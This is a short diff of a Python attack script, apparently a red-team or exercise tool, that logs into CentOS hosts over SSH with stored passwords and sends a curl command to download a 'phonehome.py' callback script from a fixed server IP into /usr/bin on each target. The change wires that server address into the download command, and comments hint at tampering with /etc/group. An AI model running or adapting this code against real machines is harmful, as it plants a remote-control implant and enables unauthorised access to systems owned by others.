@@ -242,12 +242,13 @@ def ubuntu_attacks(host):
     """
 
 def centos_attacks(host):
+    server_ip = "10.0.0.101"
     ssh = pxssh.pxssh()
     ssh.login(host.ip, host.username, password=host.password)
     # sudo update-rc.d httpd disable
     # lol
          # ez mode /etc/group
-    wget_phonehome_cmd = "curl {}/phonehome.py -o /usr/bin/etph" 
+    wget_phonehome_cmd = "curl {}/phonehome.py -o /usr/bin/etph".format(server_ip)
     log_line("Downloading phone home script on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(wget_phonehome_cmd)
     ssh.prompt()
